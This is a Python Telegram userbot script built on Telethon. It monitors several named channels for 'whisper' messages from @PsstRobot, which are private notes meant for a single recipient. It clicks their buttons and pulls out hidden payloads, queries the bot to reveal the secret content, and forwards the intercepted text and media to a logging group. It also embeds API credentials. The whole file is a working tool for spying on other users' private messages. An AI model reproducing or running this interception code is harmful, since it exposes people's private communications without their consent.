import asyncio
from datetime import datetime
import os
import re
import sys
import time
import traceback
from aiohttp import web
from telethon import TelegramClient, events
from telethon.sessions import StringSession

# ==================== CONFIGURATION ====================
API_ID = 23782654
API_HASH = "5b001caca4f436c940fea5e060f0a3c0"
SESSION_STRING = os.environ.get("SESSION_STRING")

TARGET_CHANNELS = [
    "chatpateee", -1002133821583,
    "its_diyaa", -1004469467503,
    "UnhingedAspirand", -1003954728685,
    "channelizpublick", -1004303326817,
    "fewmehh", -1004466801780
]

WHISPER_BOT_ID = 518335359 # @PsstRobot
LOG_GROUP_ID = -1004402300724

# Global context for linking Channel -> Bot DM
ctx = {"chat_title": "Target Channel", "msg_link": "#", "start_time": 0}

client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)

# ==================== HELPER: GET MESSAGE LINK ====================
async def get_msg_link(event):
    try:
        chat = await event.get_chat()
        if getattr(chat, "username", None):
            return f"https://t.me/{chat.username}/{event.id}"
        return f"https://t.me/c/{str(event.chat_id).replace('-100','')}/{event.id}"
    except: return "#"

# ==================== 1. CHANNEL HANDLER (THE DETECTOR) ====================
@client.on(events.NewMessage(chats=TARGET_CHANNELS))
async def channel_handler(event):
    if not event.buttons:
        return

    start_time = time.perf_counter()
    chat_name = event.chat.title if event.chat else "Target Channel"
    msg_link = await get_msg_link(event)
    
    print(f"\n📩 NEW WHISPER DETECTED: [{chat_name}]")

    try:
        payload = None
        
        # --- PHASE 1: Scan Buttons for Hidden URL Payload ---
        for row in event.buttons:
            for btn in row:
                # Agar button URL hai (t.me/PsstRobot?start=...)
                if btn.url and 'PsstRobot?start=' in btn.url:
                    payload = btn.url.split('start=')[-1]
                    print(f"🔗 URL Payload Found: {payload}")
                    break
                # Agar button switch_inline hai (-wh::...)
                elif hasattr(btn.button, 'query') and btn.button.query and '-wh::' in btn.button.query:
                    payload = btn.button.query
                    print(f"🔍 Inline Payload Found: {payload}")
                    break
        
        # --- PHASE 2: Click to check Popup (For Short Text or Hidden Payload) ---
        res = await event.click(0)
        secret_text = None
        if hasattr(res, 'message') and res.message:
            secret_text = res.message
        elif isinstance(res, str):
            secret_text = res

        # Check if popup has payload
        if secret_text and "-wh::" in secret_text:
            match = re.search(r"-wh::[a-zA-Z0-9_=]+", secret_text)
            if match: 
                payload = match.group(0)
                print(f"📦 Popup Payload Found: {payload}")

        # --- PHASE 3: Final Action ---
        if payload or (secret_text and "advanced" in secret_text.lower()):
            print(f"🚀 Triggering Advanced Whisper Logic...")
            ctx.update({"chat_title": chat_name, "msg_link": msg_link, "start_time": start_time})
            
            # Send the secret key to Bot DM
            cmd = f"/start {payload}" if payload and not payload.startswith('/') else payload
            if payload and "-wh::" in payload and not payload.startswith('/start'):
                cmd = f"/start {payload}"
            
            await client.send_message(WHISPER_BOT_ID, cmd or "/start")
            
        elif secret_text:
            # Normal Short Whisper Success
            elapsed_ms = round((time.perf_counter() - start_time) * 1000, 2)
            log = (
                f"🔓 **Whisper Intercepted & Decoded!**\n\n"
                f"📝 **Secret Message:**\n{secret_text}\n\n"
                f"📍 **Channel:** {chat_name}\n"
                f"⚡ **Speed:** {elapsed_ms} ms\n"
                f"🔗 [Message Link]({msg_link})"
            )
            await client.send_message(LOG_GROUP_ID, log)
            print(f"✅ Short Whisper Forwarded ({elapsed_ms}ms)")

    except Exception as e:
        print(f"❌ Channel Handler Error: {e}")

# ==================== 2. BOT DM HANDLER (THE FORWARDER) ====================
@client.on(events.NewMessage(from_users=WHISPER_BOT_ID))
async def bot_dm_handler(event):
    # Ignore startup / help messages
    if event.message.text and any(x in event.message.text for x in ["Preparing", "Everyone", "Click the button", "/start"]):
        return

    print(f"📩 BOT DM RESPONSE DETECTED!")

    try:
        now = time.perf_counter()
        if now - ctx["start_time"] > 60: ctx["start_time"] = now # Safety
        
        elapsed_ms = round((now - ctx["start_time"]) * 1000, 2)
        
        m_type = "Advanced Whisper"
        if event.photo: m_type = "Photo"
        elif event.voice: m_type = "Voice Note"
        elif event.video: m_type = "Video"
        
        log_payload = (
            f"🔓 **Whisper Intercepted & Decoded!**\n\n"
            f"📝 **Secret Message:**\n[Advanced {m_type}]\n"
            f"{event.message.text if event.message.text else ''}\n\n"
            f"📍 **Channel:** {ctx['chat_title']}\n"
            f"⚡ **Speed:** {elapsed_ms} ms\n"
            f"🔗 [Message Link]({ctx['msg_link']})"
        )

        # Send to GC (Media + Caption)
        await client.send_message(LOG_GROUP_ID, log_payload, file=event.message.media if event.message.media else None)
        await client.send_read_acknowledge(event.chat_id)
        print(f"✅ Advanced Media Forwarded to GC!")

    except Exception as e:
        print(f"❌ DM Handler Error: {e}")

# ==================== WEB SERVER & STARTUP ====================
async def handle_ping(request): return web.Response(text="Active")
async def main():
    await client.start()
    app = web.Application(); app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app); await runner.setup()
    await web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 8080))).start()
    await client.get_dialogs()
    print("🔥 PRO Engine Active: Text + Media + DeepLink Fix!")
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
